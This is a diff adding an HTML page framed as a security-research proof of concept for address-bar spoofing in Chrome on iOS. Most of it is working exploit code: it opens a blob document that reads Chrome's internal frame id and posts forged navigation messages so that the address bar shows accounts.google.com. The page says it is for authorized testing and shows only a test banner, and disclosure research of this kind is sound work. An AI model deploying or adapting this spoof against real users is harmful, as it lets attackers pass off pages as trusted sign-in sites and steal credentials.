@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="A browser security research proof of concept for iOS Chrome.">
+  <title>Address-bar spoofing PoC launcher</title>
+  <style>
+    :root {
+      color-scheme: light;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: #211d1b;
+      background: #f4f0ea;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      padding: clamp(1.25rem, 5vw, 4rem);
+      background: linear-gradient(135deg, #f4f0ea 0%, #e4eee9 55%, #f3e4dd 100%);
+    }
+
+    main {
+      width: min(100%, 44rem);
+      margin: 0 auto;
+      padding: clamp(1.25rem, 4vw, 2.5rem);
+      border: 1px solid #c9c8bd;
+      border-radius: 6px;
+      background: rgba(255, 255, 255, 0.88);
+      box-shadow: 0 16px 48px rgba(45, 51, 46, 0.1);
+    }
+
+    .eyebrow {
+      margin: 0 0 0.6rem;
+      color: #a33b2d;
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      max-width: 15ch;
+      margin: 0;
+      font-family: Georgia, "Times New Roman", serif;
+      font-size: 2.4rem;
+      font-weight: 500;
+      line-height: 1.05;
+    }
+
+    p { line-height: 1.55; }
+
+    .notice {
+      margin: 1.5rem 0;
+      padding: 1rem 1.1rem;
+      border-left: 4px solid #a33b2d;
+      background: #f8e9e2;
+    }
+
+    button {
+      min-height: 48px;
+      padding: 0.7rem 1.1rem;
+      border: 0;
+      border-radius: 4px;
+      background: #245c4b;
+      color: #fff;
+      font: inherit;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    button:hover { background: #194738; }
+    button:focus-visible { outline: 3px solid #cf743e; outline-offset: 3px; }
+
+    #status {
+      min-height: 1.5em;
+      margin-bottom: 0;
+      color: #575751;
+      overflow-wrap: anywhere;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 1rem; }
+      h1 { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <p class="eyebrow">Browser security research</p>
+    <h1>Address-bar spoofing PoC</h1>
+    <div class="notice">
+      <strong>Authorized testing only.</strong>
+      <p>This proof of concept is intended for iOS Chrome testing and security reporting. It does not collect or submit credentials.</p>
+    </div>
+    <p>Open this page in Chrome on iOS, then start the test. Other browsers will show diagnostic output instead of running the iOS-specific path.</p>
+    <button id="start" type="button">Start test</button>
+    <p id="status" role="status" aria-live="polite"></p>
+  </main>
+
+  <script>
+    "use strict";
+
+    const VICTIM = "accounts.google.com";
+    const blobDocument = `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in</title>
+  <style>
+    body { margin: 2em; background: #ffe0e0; font-family: -apple-system, sans-serif; }
+    #banner { padding: 1em; border: 3px solid #c00; background: #fff; }
+    #banner h1 { color: #c00; }
+    #diag { margin-top: 2em; color: #444; font: 11px Menlo, monospace; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <div id="banner">
+    <h1>Address-bar spoof PoC</h1>
+    <p><strong>Bug reproduced</strong> if the address bar shows <strong>__VICTIM__</strong> with a lock icon and no <code>blob:</code> prefix while this test content is displayed.</p>
+    <p>This document's real origin is <code id="real"></code>.</p>
+  </div>
+  <pre id="diag"></pre>
+  <script>
+  (function () {
+    var log = function (message) {
+      document.getElementById("diag").textContent += message + "\\n";
+      try { console.log("[poc] " + message); } catch (error) {}
+    };
+
+    document.getElementById("real").textContent = location.origin || "(opaque)";
+    log("location.href = " + location.href);
+    log("document.baseURI = " + document.baseURI);
+
+    var messageHandlers = (window.webkit && window.webkit.messageHandlers) || {};
+    if (!messageHandlers.NavigationEventMessage) {
+      log("SKIP: NavigationEventMessage handler is not available");
+      log("This test path is specific to Chrome on iOS.");
+      return;
+    }
+    log("NavigationEventMessage handler present");
+
+    var frameId = null;
+    try {
+      var gCrWeb = window.__gCrWeb;
+      if (gCrWeb && typeof gCrWeb.getFrameId === "function") {
+        frameId = gCrWeb.getFrameId();
+        log("__gCrWeb.getFrameId() = " + frameId);
+      }
+    } catch (error) {
+      log("__gCrWeb.getFrameId() threw: " + error);
+    }
+
+    if (!frameId) {
+      var accessors = [
+        function () { return window.__gCrWeb.common.getFrameId(); },
+        function () { return window.__gCrWeb.message.getFrameId(); },
+        function () { return window.__gCrWeb.frameId; }
+      ];
+      for (var index = 0; index < accessors.length && !frameId; index++) {
+        try {
+          frameId = accessors[index]();
+          log("fallback[" + index + "] -> " + frameId);
+        } catch (error) {}
+      }
+    }
+
+    if (!frameId) {
+      log("FAIL: could not read the page-world frame_id");
+      log("__gCrWeb keys: " + (window.__gCrWeb ? Object.keys(window.__gCrWeb).join(",") : "(absent)"));
+      return;
+    }
+
+    var registerFrame = function () {
+      var attempts = [
+        function () { window.__gCrWeb.registerFrame(); },
+        function () { window.__gCrWeb.crweb.registerFrame(); }
+      ];
+      for (var index = 0; index < attempts.length; index++) {
+        try {
+          attempts[index]();
+          log("registerFrame() via path[" + index + "]");
+          return;
+        } catch (error) {}
+      }
+      log("registerFrame() not reachable (native code may call it)");
+    };
+
+    registerFrame();
+    var spoofUrl = "blob:https://__VICTIM__/signin";
+
+    var postEvents = function (attempt) {
+      var currentFrameId = frameId;
+      try { currentFrameId = window.__gCrWeb.getFrameId() || frameId; } catch (error) {}
+      try {
+        messageHandlers.NavigationEventMessage.postMessage({
+          command: "willChangeState",
+          frame_id: currentFrameId
+        });
+        messageHandlers.NavigationEventMessage.postMessage({
+          command: "didReplaceState",
+          frame_id: currentFrameId,
+          stateObject: "",
+          baseUrl: "https://x/",
+          pageUrl: spoofUrl
+        });
+        log("[" + attempt + "] posted didReplaceState pageUrl=" + spoofUrl);
+      } catch (error) {
+        log("[" + attempt + "] postMessage threw: " + error);
+      }
+    };
+
+    postEvents(0);
+    setTimeout(function () { registerFrame(); postEvents(1); }, 150);
+    setTimeout(function () { postEvents(2); }, 500);
+    setTimeout(function () { postEvents(3); }, 1200);
+    setTimeout(function () {
+      log("");
+      log("Expected steady-state address-bar hostname: __VICTIM__");
+      log("If unchanged, the write may have been rejected by a native validation gate.");
+    }, 1400);
+  })();
+  <\/script>
+</body>
+</html>`;
+
+    const startButton = document.getElementById("start");
+    const status = document.getElementById("status");
+
+    startButton.addEventListener("click", function () {
+      if (!window.URL || !window.Blob) {
+        status.textContent = "This browser does not support Blob URLs.";
+        return;
+      }
+
+      const page = blobDocument.replace(/__VICTIM__/g, VICTIM);
+      const blobUrl = URL.createObjectURL(new Blob([page], { type: "text/html;charset=utf-8" }));
+      status.textContent = "Opening the test document...";
+      window.location.assign(blobUrl);
+    });
+  </script>
+</body>
+</html>
